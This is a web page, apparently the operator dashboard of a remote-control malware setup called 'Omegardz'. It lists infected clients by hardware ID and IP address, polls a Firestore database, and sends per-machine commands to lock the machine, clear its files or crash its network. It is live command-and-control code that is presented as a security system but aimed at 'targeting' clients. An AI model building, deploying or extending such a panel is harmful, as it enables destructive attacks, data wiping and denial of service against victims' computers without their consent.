<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Omegardz Administrator Panel</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #020617; color: #f8fafc; margin: 0; padding: 20px; }
        h1 { color: #f43f5e; text-align: center; }
        .container { max-width: 1200px; margin: auto; background: #0f172a; padding: 20px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #1e293b; }
        th { background-color: #1e293b; color: #38bdf8; }
        .badge-online { background-color: #10b981; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
        .badge-offline { background-color: #ef4444; color: white; padding: 4px 8px; border-radius: 4px; font-size: 12px; }
        button { padding: 6px 10px; margin: 2px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; font-size: 11px; }
        .btn-lock { background-color: #f43f5e; color: white; }
        .btn-unlock { background-color: #10b981; color: white; }
        .btn-clean { background-color: #eab308; color: black; }
        .btn-netoff { background-color: #a855f7; color: white; }
        .btn-neton { background-color: #3b82f6; color: white; }
        button:hover { opacity: 0.8; }
        .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #64748b; }
    </style>
</head>
<body>

<div class="container">
    <h1>OMEGARDZ CONTROL PANEL</h1>
    <p>Manage and target specific clients in real-time.</p>
    
    <table id="clientTable">
        <thead>
            <tr>
                <th>HWID</th>
                <th>Public IP</th>
                <th>Local IP</th>
                <th>Status</th>
                <th>Actions (Targeted Controls)</th>
            </tr>
        </thead>
        <tbody>
            <!-- Dito kusang papasok ang mga client mula sa Firestore -->
        </tbody>
    </table>
</div>

<div class="footer">Omegardz Security System &copy; 2026</div>

<script>
    const PROJECT_ID = "omegardz";
    const FIRESTORE_REST_URL = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/omegards_clients`;

    async function fetchClients() {
        try {
            let response = await fetch(FIRESTORE_REST_URL);
            let data = await response.json();
            let tbody = document.querySelector("#clientTable tbody");
            tbody.innerHTML = "";

            if (!data.documents) return;

            data.documents.forEach(doc => {
                let nameParts = doc.name.split('/');
                let hwid = nameParts[nameParts.length - 1];
                let fields = doc.fields || {};
                
                let publicIp = fields.public_ip ? fields.public_ip.stringValue : "N/A";
                let localIp = fields.local_ip ? fields.local_ip.stringValue : "N/A";
                let status = fields.status ? fields.status.stringValue : "OFFLINE";

                let tr = document.createElement("tr");
                tr.innerHTML = `
                    <td><code>${hwid}</code></td>
                    <td>${publicIp}</td>
                    <td>${localIp}</td>
                    <td><span class="${status === 'ONLINE' ? 'badge-online' : 'badge-offline'}">${status}</span></td>
                    <td>
                        <button class="btn-lock" onclick="sendCommand('${hwid}', 'lock')">Lock</button>
                        <button class="btn-unlock" onclick="sendCommand('${hwid}', 'unlock')">Unlock</button>
                        <button class="btn-clean" onclick="sendCommand('${hwid}', 'clear_files')">Clear Files</button>
                        <button class="btn-netoff" onclick="sendCommand('${hwid}', 'crash_net')">Crash Net</button>
                        <button class="btn-neton" onclick="sendCommand('${hwid}', 'restore_net')">Restore Net</button>
                    </td>
                `;
                tbody.appendChild(tr);
            });
        } catch (e) {
            console.error("Error fetching clients:", e);
        }
    }

    async function sendCommand(hwid, commandAction) {
        let baseDocUrl = `https://firestore.googleapis.com/v1/projects/${PROJECT_ID}/databases/(default)/documents/omegards_clients/${hwid}`;
        let updateUrl = `${baseDocUrl}?updateMask.fieldPaths=command`;
        
        let payload = {
            "fields": {
                "command": { "stringValue": commandAction }
            }
        };

        try {
            let response = await fetch(updateUrl, {
                method: "PATCH",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(payload)
            });

            if (response.status === 404) {
                let createPayload = {
                    "fields": {
                        "hwid": { "stringValue": hwid },
                        "command": { "stringValue": commandAction },
                        "status": { "stringValue": "OFFLINE" }
                    }
                };
                await fetch(baseDocUrl, {
                    method: "PATCH",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(createPayload)
                });
            } else if (!response.ok) {
                alert("Failed to update command on server.");
                return;
            }

            console.log(`Command '${commandAction}' sent successfully to ${hwid}`);
            fetchClients();
        } catch (e) {
            console.error("Error sending command:", e);
            alert("Connection error while sending command.");
        }
    }

    setInterval(fetchClients, 3000);
    fetchClients();
</script>

</body>
</html>
